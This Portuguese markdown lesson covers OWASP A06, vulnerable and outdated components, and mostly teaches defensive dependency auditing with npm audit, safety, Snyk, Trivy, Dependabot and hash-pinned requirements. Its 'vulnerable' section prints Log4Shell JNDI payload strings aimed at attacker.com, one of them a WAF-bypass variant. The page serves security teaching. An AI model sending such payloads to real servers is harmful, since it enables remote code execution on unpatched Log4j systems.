# 📦 A06 - Componentes Vulneráveis e Desatualizados

## 📖 Teoria (20%)

Uso de bibliotecas, frameworks e dependências com **vulnerabilidades conhecidas**. Inclui ataques à cadeia de suprimentos (Supply Chain Attacks).

---

## 💻 Prática (80%)

### 🔴 Vulnerável — Dependências desatualizadas

```bash
# Verificar versões instaladas vs CVEs conhecidos
pip list  # Ver pacotes Python instalados
npm list  # Ver pacotes Node instalados

# Log4Shell (CVE-2021-44228) — exemplo real devastador
# Log4j < 2.15.0 — RCE via: ${jndi:ldap://attacker.com/exploit}
# Afetou: Apple, Twitter, Amazon, Cloudflare, etc.

# Payload de exploração:
# ${jndi:ldap://attacker.com:1389/exploit}
# ${${lower:j}ndi:${lower:l}dap://attacker.com/exploit}  # Bypass de WAF
```

### 🟢 Seguro — Gestão de dependências

```bash
# ✅ Python — Verificar vulnerabilidades
pip install safety
safety check

# ✅ Node.js — Auditoria de dependências
npm audit
npm audit fix  # Corrige automaticamente o que for possível
npm audit fix --force  # Força atualizações major (cuidado!)

# ✅ Snyk — Análise profissional
snyk test
snyk monitor  # Monitoramento contínuo
snyk fix      # Correção automática

# ✅ OWASP Dependency-Check
dependency-check --project "MeuProjeto" --scan ./src --format HTML

# ✅ GitHub Dependabot — cria PRs automáticos
# .github/dependabot.yml:
```

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
    reviewers:
      - "security-team"
    
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"  # diário para projetos críticos
```

```bash
# ✅ Trivy — scan de containers e código
trivy image python:3.11          # Vulnerabilidades na imagem
trivy fs ./                       # Vulnerabilidades no código
trivy repo github.com/user/repo  # Repositório remoto

# ✅ Grype — alternativa ao Trivy
grype docker.io/myapp:latest
```

```python
# ✅ requirements.txt com versões pinadas E hash verification
# pip freeze > requirements.txt
# pip install --require-hashes -r requirements.txt

# requirements.txt seguro:
flask==3.0.3 \
    --hash=sha256:34f2fcd...
cryptography==42.0.5 \
    --hash=sha256:a8c2a...
```

### ✅ Checklist
- [ ] `npm audit` / `safety check` no pipeline CI/CD
- [ ] Dependabot ou Renovate habilitado no repositório
- [ ] Imagens Docker com scan de vulnerabilidades
- [ ] SBOMs (Software Bill of Materials) gerados
- [ ] Política de atualização de dependências documentada
- [ ] Monitorar CVEs de componentes críticos (NVD, GitHub Advisories)
